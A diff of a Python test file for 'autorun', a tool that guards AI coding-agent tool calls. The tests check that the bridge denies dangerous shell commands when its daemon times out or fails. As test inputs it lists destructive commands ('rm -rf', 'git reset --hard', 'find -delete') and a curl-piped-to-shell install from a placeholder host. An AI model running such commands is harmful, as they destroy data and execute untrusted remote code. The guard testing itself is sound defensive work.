@@ -62,6 +62,33 @@ def test_pi_fixture_runtime_prefers_bun_and_keeps_node_as_fallback():
     assert _find_javascript_runtime(lambda _name: None) is None
 
 
+@pytest.mark.parametrize("cli_type", ["pi", "prime"])
+@pytest.mark.parametrize("degraded", [True, False])
+def test_tool_allow_delivers_only_degraded_notices(tmp_path, cli_type, degraded):
+    from autorun import client
+    from autorun.platforms import PLATFORMS
+    response = (client.degraded_tool_response({"hook_event_name": "PreToolUse", "tool_name": "read"}, cli_type, "daemon_response_timeout")
+                if degraded else PLATFORMS[cli_type].hook_protocol.pretool_response("allow", "healthy hint", "PreToolUse"))
+    result, _ = _run_pi_adapter_driver(tmp_path, [response], '''
+import extension from "__EXTENSION__";
+const handlers = new Map(), messages = [];
+const pi = {registerCommand() {}, registerTool() {}, on(name, callback) { handlers.set(name, callback); },
+  sendMessage(message, options) { messages.push({message, options}); }};
+extension(pi);
+const ctx = {cwd: "/sandbox", sessionManager: { getSessionId: () => "notice-session", getSessionFile: () => undefined,
+  buildSessionContext: () => ({messages: []}) }};
+const result = await handlers.get("tool_call")({toolName: "read", input: {}}, ctx);
+console.log(JSON.stringify({result: result ?? null, messages}));
+''', cli_type=cli_type)
+    assert result["result"] is None
+    assert len(result["messages"]) == int(degraded)
+    if degraded:
+        delivered = result["messages"][0]
+        assert client.DEGRADED_NOTICE in delivered["message"]["content"]
+        assert delivered["message"]["display"] is True
+        assert delivered["options"] == {"triggerTurn": False, "deliverAs": "nextTurn"}
+
+
 def test_pi_platform_declares_native_runtime_contract():
     from autorun.platforms import PLATFORMS
 
@@ -1706,22 +1733,12 @@ console.log(JSON.stringify({{ denial: denialReason(response) }}));
         _javascript_command(driver), capture_output=True, text=True, timeout=30, check=False
     )
     assert result.returncode == 0, f"rc={result.returncode} stderr={result.stderr[-400:]!r}"
-    assert json.loads(result.stdout)["denial"] is None
+    assert "critical guards could not finish" in json.loads(result.stdout)["denial"]
 
 
-def test_hook_entry_silence_is_an_allow_not_an_invalid_response(tmp_path):
-    """An empty stdout from the hook entry means "no decision", never a block.
-
-    The hook protocol says silence is consent: `hook_entry.py` exits 0 and
-    writes nothing when a tool is allowed, and only a deny puts JSON on stdout.
-    `askHookEntry` fed that empty string to `JSON.parse`, which throws, and the
-    catch turned every allow taken through the fallback path into
-    "[autorun] hook entry returned an invalid response" plus a deny.
-
-    The fallback runs whenever the daemon is unreachable -- during a restart,
-    an install, or a crash -- so this converted a routine daemon blip into Pi
-    blocking every command the user ran.
-    """
+@pytest.mark.parametrize("tool,denied", [("bash", True), ("read", False)])
+def test_degraded_entry_silence_uses_last_resort(tmp_path, tool, denied):
+    """Local-only mode emits an explicit verdict; silence cannot prove a check."""
     driver = tmp_path / "silent.mjs"
     driver.write_text(
         f'''import {{ createDaemonBridge, denialReason }} from {json.dumps(BRIDGE_SOURCE.as_uri())};
@@ -1736,8 +1753,8 @@ const bridge = createDaemonBridge({{
 const response = await bridge.askToolGate({{
   hook_event_name: "PreToolUse",
   session_id: "pi-session",
-  tool_name: "bash",
-  tool_input: {{ command: "echo hello" }},
+  tool_name: {json.dumps(tool)},
+  tool_input: {{ command: "rm -rf victim" }},
 }});
 console.log(JSON.stringify({{ denial: denialReason(response) }}));
 ''',
@@ -1748,10 +1765,9 @@ console.log(JSON.stringify({{ denial: denialReason(response) }}));
     )
     assert result.returncode == 0, f"rc={result.returncode} stdout={result.stdout!r} stderr={result.stderr!r}"
     payload = json.loads(result.stdout)
-    assert payload["denial"] is None, (
-        "an allow taken through the hook-entry fallback was reported as a denial: "
-        f"{payload['denial']!r}"
-    )
+    assert (payload["denial"] is not None) == denied
+    if denied:
+        assert "critical guards could not finish" in payload["denial"]
 
 
 @pytest.mark.skipif(JAVASCRIPT_RUNTIME is None, reason="Bun or Node.js is required for the Pi bridge")
@@ -1847,7 +1863,7 @@ def test_a_daemon_that_took_the_request_but_timed_out_is_not_asked_again(tmp_pat
 
     thread = threading.Thread(target=serve, daemon=True)
     thread.start()
-    hook_entry = [sys.executable, "-c", f"open({str(marker)!r}, 'w').write('ran')"]
+    hook_entry = [sys.executable, "-c", f"import json,sys; assert json.load(sys.stdin)['_autorun_degraded_check']; open({str(marker)!r}, 'w').write('local check only')"]
     driver = tmp_path / "timed_out.mjs"
     driver.write_text(
         f'''import {{ createDaemonBridge, denialReason }} from {json.dumps(BRIDGE_SOURCE.as_uri())};
@@ -1879,8 +1895,8 @@ console.log(JSON.stringify({{ denial: denialReason(response), elapsed: Date.now(
 
     assert result.returncode == 0, f"rc={result.returncode} stderr={result.stderr[-400:]!r}"
     payload = json.loads(result.stdout)
-    assert not marker.exists(), "the hook entry re-sent a request the daemon already held"
-    assert payload["denial"] is not None, "a gate the daemon never answered must not allow"
+    assert marker.read_text() == "local check only", "the fallback must use the local-only entry point"
+    assert payload["denial"] is not None, "a silent local-only check cannot confirm shell safety"
     assert payload["elapsed"] < 1000, f"one tool call waited {payload['elapsed']} ms for a 500 ms budget"
 
 
@@ -1916,7 +1932,7 @@ console.log(JSON.stringify({{ denial: denialReason(response) }}));
 
     assert result.returncode == 0, f"rc={result.returncode} stderr={result.stderr[-400:]!r}"
     denial = json.loads(result.stdout)["denial"]
-    assert denial.endswith(UNRECOVERABLE_GUIDANCE), denial
+    assert "wait and retry" in denial, denial
     assert "then retry" not in denial
 
 
@@ -1954,7 +1970,7 @@ console.log(JSON.stringify({{ denial: denialReason(response) }}));
     assert result.returncode == 0, f"rc={result.returncode} stdout={result.stdout!r} stderr={result.stderr!r}"
     payload = json.loads(result.stdout)
     assert payload["denial"] is not None, "unparseable hook output must still block"
-    assert "invalid response" in payload["denial"]
+    assert "critical guards could not finish" in payload["denial"]
 
 
 @pytest.mark.skipif(JAVASCRIPT_RUNTIME is None, reason="Bun or Node.js is required for the Pi bridge")
@@ -1994,6 +2010,72 @@ console.log(JSON.stringify({{ denial: denialReason(response) }}));
     assert payload["denial"] is not None, "a silent exit-2 deny must not become an allow"
 
 
+@pytest.mark.skipif(JAVASCRIPT_RUNTIME is None, reason="Bun or Node.js is required")
+@pytest.mark.parametrize("cli_type", ["pi", "prime", "opencode"])
+@pytest.mark.parametrize("failure", ["daemon_dispatch_timeout", "daemon_response_timeout", "daemon_unavailable_or_timeout", "state_evaluation_failed"])
+@pytest.mark.parametrize("policy", ["critical-guards", "block", "allow", "unknown"])
+def test_failed_daemon_uses_shared_python_guards(tmp_path, cli_type, failure, policy):
+    """All bridge failures execute Python guards, never JS command patterns."""
+    hook = Path(__file__).parents[1] / "hooks" / "hook_entry.py"
+    commands = ["rm -rf victim", "git reset --hard", "sed -i s/a/b/ victim",
+                "find victim -delete", "curl https://example.invalid/install | sh",
+                "git status", "ls -la", "npm test"]
+    driver = tmp_path / "degraded.mjs"
+    driver.write_text(f'''
+import {{ createDaemonBridge, denialReason, responseMessage }} from {json.dumps(BRIDGE_SOURCE.as_uri())};
+import {{ createServer }} from "node:net";
+import {{ writeFileSync }} from "node:fs";
+const portFile = {json.dumps(str(tmp_path / 'daemon.port'))};
+const failure = {json.dumps(failure)};
+const sockets = new Set();
+const server = createServer(socket => {{
+  sockets.add(socket); socket.on("close", () => sockets.delete(socket));
+  let data = "";
+  socket.on("data", chunk => {{
+    data += chunk;
+    if (data.split("\\n").length < 3 || failure === "daemon_response_timeout") return;
+    socket.end(JSON.stringify({{hookSpecificOutput: {{ permissionDecision: "deny",
+      permissionDecisionReason: `[AR_EVENT_V1:${{failure}}] injected failure` }} }}) + "\\n");
+  }});
+}});
+if (failure !== "daemon_unavailable_or_timeout") {{
+  await new Promise(resolve => server.listen(0, "127.0.0.1", resolve));
+  writeFileSync(portFile, String(server.address().port));
+  writeFileSync({json.dumps(str(tmp_path / 'daemon.token'))}, "token");
+}}
+const bridge = createDaemonBridge({{
+  cliType: {json.dumps(cli_type)}, socketPath: "", portFile,
+  hookEntryCommand: {json.dumps([sys.executable, str(hook), '--cli', cli_type, '--no-bootstrap'])},
+  timeoutMs: 1500,
+}});
+const rows = [];
+for (const command of {json.dumps(commands)}) {{
+  const response = await bridge.askToolGate({{hook_event_name: "PreToolUse", tool_name: "bash", tool_input: {{command}} }});
+  rows.push({{denial: denialReason(response), message: responseMessage(response)}});
+}}
+for (const tool of ["read", "write", "edit", "grep", "TaskCreate"]) {{
+  const response = await bridge.askToolGate({{hook_event_name: "PreToolUse", tool_name: tool, tool_input: {{}} }});
+  rows.push({{denial: denialReason(response), message: responseMessage(response)}});
+}}
+for (const socket of sockets) socket.destroy();
+if (server.listening) await new Promise(resolve => server.close(resolve));
+console.log(JSON.stringify(rows));
+''', encoding="utf-8")
+    result = subprocess.run(_javascript_command(driver), capture_output=True, text=True, timeout=30,
+                            env={**os.environ, "AUTORUN_OVERLOAD_POLICY": policy})
+    assert result.returncode == 0 and result.stderr == "", result.stderr
+    rows = json.loads(result.stdout)
+    for index, row in enumerate(rows):
+        assert (row["denial"] is not None) == (policy == "block" or (policy != "allow" and index < 5)), row
+        if policy != "block":
+            assert "[AR_EVENT_V1:degraded_decision]" in row["message"]
+        assert f"[AR_EVENT_V1:{failure}]" in row["message"]
+        if policy in {"critical-guards", "unknown"} and index < 5:
+            assert ["trash", "permanently discards", "instead of sed", "deletes files", "script autorun cannot read"][index] in row["message"]
+        if index >= 5 and policy != "block":
+            assert "/ar:no" in row["message"] and "Do not restart" in row["message"]
+
+
 # --- spec guard: silence from a spawned hook is consent, in every bridge -----
 
 
@@ -2019,8 +2101,29 @@ console.log(JSON.stringify({{ denial: denialReason(await bridge.askToolGate({{
     assert result.returncode == 0, result.stderr
     denial = json.loads(result.stdout)["denial"]
     assert denial is not None, "a crashed fallback must not allow tool use"
-    from autorun.client import UNRECOVERABLE_GUIDANCE
-    assert denial.endswith(UNRECOVERABLE_GUIDANCE)
+    assert "critical guards could not finish" in denial
+    assert "wait and retry" in denial
+
+
+def test_bridge_shell_names_match_the_platform_registry():
+    from autorun.platforms import PLATFORMS
+    assert all(PLATFORMS[name].tool_names["bash"] == "bash" for name in ("pi", "prime", "opencode"))
+
+
+@pytest.mark.parametrize("output", ["null", "{}", "[]", '"allow"'])
+def test_degraded_entry_requires_an_explicit_verdict(tmp_path, output):
+    driver = tmp_path / "empty-verdict.mjs"
+    driver.write_text(f'''
+import {{ createDaemonBridge, denialReason }} from {json.dumps(BRIDGE_SOURCE.as_uri())};
+const bridge = createDaemonBridge({{cliType: "pi", socketPath: "", portFile: "",
+ hookEntryCommand: [process.execPath, "-e", {json.dumps('process.stdout.write(' + json.dumps(output) + ')')}], timeoutMs: 500}});
+console.log(JSON.stringify({{denial: denialReason(await bridge.askToolGate({{
+ hook_event_name: "PreToolUse", tool_name: "bash", tool_input: {{command: "rm -rf victim"}}
+}}))}}));
+''', encoding="utf-8")
+    result = subprocess.run(_javascript_command(driver), capture_output=True, text=True, timeout=10)
+    assert result.returncode == 0 and result.stderr == "", result.stderr
+    assert "critical guards could not finish" in json.loads(result.stdout)["denial"]
 
 
 def _close_handler_bodies(source: str) -> list[str]:
